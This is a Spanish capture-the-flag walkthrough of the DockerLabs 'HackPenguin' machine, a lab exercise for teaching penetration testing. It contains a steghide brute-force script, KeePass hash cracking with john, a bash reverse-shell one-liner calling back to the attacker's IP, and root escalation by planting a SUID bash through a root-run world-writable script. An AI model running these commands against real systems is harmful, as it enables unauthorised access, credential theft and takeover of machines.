# Máquina HackPenguin

---------------------

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 22 y 80:

```shell
nmap -sCV -p22,80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa139524c708e836516dabb2e53e3bda (ECDSA)
|_  256 e2f3811f7dd0eaede0c63811ed953a38 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Vemos la versión de Apache y del servicio SSH. Entramos a la web del puerto 80 para inspeccionarla:

![Pasted image 20240413001646](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9579a77b-b43b-4220-979c-55a6bf775a7c)

Nos encontramos con la web por defecto de Apache. He revisado el código fuente con **Ctrl + U** pero no hay ninguna pista. Por lo que realizaremos **fuzzing** para tratar de encontrar directorios y archivos con extensiones que indicaremos con el parámetro "**-x**" que puedan ser interesantes.

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
--------------------------------------------------------
/index.html           (Status: 200) [Size: 10671]
/penguin.html         (Status: 200) [Size: 342]  
/server-status        (Status: 403) [Size: 275]  
```

Encontramos un archivo interesante que es -> **penguin.html**.
Accedemos a él para ver que nos encontramos:

![Pasted image 20240413002142](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/0bc29e24-7166-42a9-a805-03b5bf4e2c68)

Como no encontramos ningún vector claro de ataque, vamos a revisar la imagen a ver si hubiera algo escondido en los bits menos significativos de la imagen. A esto se le conoce como **esteganografía**.

Descargamos la imagen y utilizaremos la herramienta **steghide**

```shell
steghide --extract -sf penguin.jpg 
```

Nos pide un "salvoconducto" o contraseña. Podemos indicarla con el parámetro **-p**. Pondremos una cualquiera a ver cual es el resultado.

---------------

## Explotación


```shell
steghide --extract -sf penguin.jpg -p holaguapo
------------------------------------------------
steghide: no pude extraer ningn dato con ese salvoconducto!
```

Vamos a utilizar esta respuesta para montarnos un script en **bash** de fuerza bruta que vaya probando una a una las contraseñas del **rockyou** y cuando el output que nos devuelva **steghide** sea diferente, supondremos que es porque esa es la contraseña correcta.

Mi script **stegCrack.sh**:

```shell
#!/bin/bash

# Rutas
rockyou_file="/usr/share/wordlists/rockyou.txt"
penguin_file="/home/albertomarcostic/Desktop/DockerLabs/HackPenguin/penguin.jpg"
database_file="/home/albertomarcostic/Desktop/DockerLabs/HackPenguin/database.kdbx"
output=""
nIntentos=0

# Verificar si el archivo rockyou.txt existe
if [ ! -f "$rockyou_file" ]; then
    echo "El archivo rockyou.txt no existe en la ruta indicada"
    exit 1
fi

# Verificar si el archivo database.kdbx existe y eliminarlo si es así
if [ -f "$database_file" ]; then
    echo "El archivo database.kdbx existe. Borrándolo..."
    rm "$database_file"
fi

# Verificar si el archivo penguin.jpg existe
if [ ! -f "$penguin_file" ]; then
    echo "El archivo penguin.jpg no existe en la ruta indicada"
    exit 1
fi

# Bucle para leer cada línea del archivo rockyou.txt y mostrarla por pantalla
while IFS= read -r password; do

    output=$(steghide --extract -sf "$penguin_file" -p "$password" 2>&1)
    let "nIntentos++"
    if [[ $output == *"no pude"* ]]; then
        echo -ne "Probando la contraseña: $password\r"
        echo -ne "Número de contraseñas probadas: $nIntentos\r"
    else
        echo -e "\n------------------------------------"
        echo -e "\nContraseña encontrada: $password"
        break
    fi
done < "$rockyou_file"
```

**IMPORTANTE** -> Cambiar las rutas absolutas **rockyou_file, penguin_file y database_file** a las que apliquen en tu caso.

---------------------
Voy a dejar un script más extenso en mi **github** donde poder indicar el diccionario que quieres usar, y el nombre de la imagen para que puedas utilizarlo fácilmente en cualquier situación.

Enlace al script -> [estegCrack.sh](https://github.com/albertomarcostic/estegCrack)

-------------------

Le damos permisos de ejecución y lo ejecutamos:

```shell
./estegcrack.sh
---------------------------------

Número de contraseñas probadas: 26
Contraseña encontrada: chocolate
```

Este script nos extrae un archivo oculto, usando la contraseña -> **chocolate**

Nos encontramos con un archivo con extensión -> **.kdbx**
Para abrir este archivo, será necesario installar **KeyPass** si no lo tenemos.
Lo podemos hacer con:

```shell
apt install keepass2
```

Lo podremos abrir directamente con:

```shell
keepass2 penguin.kdbx
```

Per vemos que nos pide una contraseña. Si utilizamos la misma de antes -> **chocolate**, no va a funcionar. Por lo que vamos a intentar crackearla con **john**.
Para ello utilizaremos la utilidad **keepass2john**, para pasarlo a un formato hash y que **john** pueda romperlo:

```shell
keepass2john penguin.kdbx > hash
john hash
-----------------------------------------
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
password1        (penguin)
```

Encontramos la contraseña -> **password1**
Ahora ya lo podemos abrir:

```
keepass2 penguin.kdbx
```

![Pasted image 20240413213256](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/f4f16794-e0f2-489d-9cdd-a7eb0643d62e)

Dentro del gestor de contraseñas vemos un username y una contraseña.

Username -> **pinguino**
Contraseña -> **pinguinomaravilloso123** (podemos copiarla directamente del gestor de contraseñas)

Vamos a utilizar estas credenciales para intentar entrar a la base de datos mysql, puerto 3306. No nos funciona. Lo probamos en el SSH y tampoco nos funciona.
Ahora probamos con **penguin** que es el grupo al que pertenece el usuario pinguino según el gestor de contraseña y logramos entrar por SSH con las credenciales: **penguin:pinguinomaravilloso123**

```shell
ssh penguin@172.17.0.2
(ponemos la contraseña)
```

Estamos dentro.

----------------------
### Tratamiento de la tty

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/192.168.1.39/443 0>&1" 
```

(Siendo la 192.168.1.39 mi IP de la máquina atacante)

---------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------

## Escalada de privilegios

En el directorio /home del usuario **hackpenguin**, encontramos un **script.sh**.
Es extraño porque vemos que tiene los permisos **777** y le pertenece a **root**, si conseguimos que root lo ejecute podremos modificarlo y ejecutar lo que queramos.

```shell
ls -l script.sh
------------------------------------------
-rwxrwxrwx 1 root root 56 Apr 15 07:26 script.sh
```

Revisamos los procesos que están corriendo:

```shell
ps -faux
---------------------------
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  6.6  0.0   2892   968 ?        Ss   14:27   0:19 /bin/sh -c service apache2 start && service ssh start && while true; do /bin/bash /home/hackpenguin/script.sh; done
root          25  0.0  0.0   6780  4812 ?        Ss   14:27   0:00 /usr/sbin/apache2 -k start
```

Podemos ver que **root** está ejecutando cada cierto tiempo el script que está dentro del directorio /home de **hackpengui**.

Lo editaremos para que de permiso **SUID** a la bash directamente, y esperaremos a que root lo ejecute.

![Pasted image 20240415143522](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/e5427bfe-aeb5-4b58-81ae-a6556bbdcc7a)

Tras esperar un poco:

```shell
ls -l /bin/bash
----------------
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Abusamos de esta para escalar privilegios a root:

```shell
bash -p
```

```shell
whoami
--------------
root
```

Hemos conseguido el nivel de privilegios máximo!
